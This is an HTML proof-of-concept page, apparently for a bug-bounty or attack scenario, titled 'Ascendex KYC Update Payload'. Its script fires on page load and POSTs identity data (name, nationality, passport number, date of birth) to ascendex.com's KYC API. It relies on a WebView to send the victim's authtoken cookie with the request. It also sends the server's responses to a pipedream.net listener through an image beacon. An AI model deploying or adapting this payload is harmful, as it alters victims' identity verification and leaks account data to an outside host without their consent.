<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ascendex KYC Update Payload</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 15px; color: #333; }
        h1 { color: #d9534f; }
        p { margin-bottom: 10px; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ccc; border-radius: 4px; white-space: pre-wrap; word-wrap: break-word; min-height: 60px; }
        .highlight { font-weight: bold; color: #5cb85c; }
    </style>
</head>
<body>
    <h1>KYC Update Payload Active!</h1>
    <p>This page is loaded from: <strong id="originDisplay"></strong></p>
    <p>Attempting to submit KYC Level 1 data to ascendex.com API...</p>
    <p id="status">Status: Initializing payload...</p>

    <h2>Request Body:</h2>
    <pre id="requestBodyDisplay"></pre>

    <h2>Server Response:</h2>
    <pre id="responseOutput"></pre>

<script>
    // Optional: For logging success/failure of this script's actions to a separate listener
    // If you don't need this, you can remove logToServer and its calls.
    const SCRIPT_EXECUTION_LISTENER_URL = "https://eo44gjggs7bwq2a.m.pipedream.net/"; // <-- Optional: REPLACE

    const statusP = document.getElementById('status');
    const responseOutputPre = document.getElementById('responseOutput');
    const requestBodyPre = document.getElementById('requestBodyDisplay');
    const originDisplayStrong = document.getElementById('originDisplay');

    originDisplayStrong.textContent = window.location.origin;

    function updateStatus(message, isSuccess = false) {
        console.log(message);
        statusP.textContent = "Status: " + message;
        if (isSuccess) {
            statusP.style.color = "green";
        } else if (message.startsWith("ERROR")) {
            statusP.style.color = "red";
        } else {
            statusP.style.color = "inherit";
        }
    }

    // Optional logging function
    function logToServer(data) {
        if (!SCRIPT_EXECUTION_LISTENER_URL.startsWith("https://eo44gjggs7bwq2a.m.pipedream.net/")) { // Only log if URL is changed
            try {
                let encodedData = encodeURIComponent(JSON.stringify(data));
                let requestUrl = SCRIPT_EXECUTION_LISTENER_URL + "?type=KYC_UPDATE_VIA_JCOMMON&data=" + encodedData;
                var img = new Image();
                img.src = requestUrl;
                console.log("Logged script action to listener:", requestUrl);
            } catch (e) { console.error("Script log error:", e); }
        }
    }

    // --- Main Execution: Submit KYC Data ---
    window.onload = function() {
        updateStatus("Page loaded. Preparing KYC POST request to ascendex.com...");

        const kycApiUrl = "https://ascendex.com/api/a/v1/auth/kyc/level1"; // Target API
        const kycData = {
            nationality: "PK",
            lastName: "REZIHK",
            firstName: "TEST",
            middleName: "KHAN",    // Your middle name
            idType: "passport",
            idNumber: "GF561799", // The new ID number you want to submit
            dob: "1998-01-02"
        };

        requestBodyPre.textContent = JSON.stringify(kycData, null, 2); // Display the data being sent

        fetch(kycApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Language': 'en-us',
                'Platform': 'website',
                'Accept': 'application/json'
                // WebView should auto-send 'Cookie: authtoken=...'
            },
            body: JSON.stringify(kycData)
        })
        .then(response => {
            updateStatus("KYC POST request sent. Server responded with status: " + response.status);
            logToServer({ action: "kyc_post_sent", status: response.status, url: kycApiUrl });
            return response.text();
        })
        .then(textData => {
            console.log("KYC Response Text:", textData);
            responseOutputPre.textContent = "Raw Response:\n\n" + textData;
            try {
                const jsonData = JSON.parse(textData);
                responseOutputPre.textContent += "\n\nParsed JSON Response:\n\n" + JSON.stringify(jsonData, null, 2);
                logToServer({ action: "kyc_response_json", data: jsonData });

                if (jsonData.code === 0 || (jsonData.message && jsonData.message.toLowerCase().includes("success"))) {
                     updateStatus("SUCCESS: KYC data submission attempt reported success by server.", true);
                } else {
                     updateStatus("INFO: KYC data submission attempt completed, server indicated an issue (Code: " + jsonData.code + ", Message: " + jsonData.message + ").");
                }
            } catch (e) {
                logToServer({ action: "kyc_response_non_json", data: textData.substring(0, 200) });
                updateStatus("INFO: KYC data submission response was not JSON (see raw response).");
            }
        })
        .catch(error => {
            updateStatus("ERROR: KYC POST request failed: " + error);
            console.error('KYC POST Error:', error);
            responseOutputPre.textContent = "Error making POST request to " + kycApiUrl + ":\n\n" + error;
            logToServer({ action: "kyc_post_error", error: error.toString() });
        });
    };
</script>

</body>
</html>
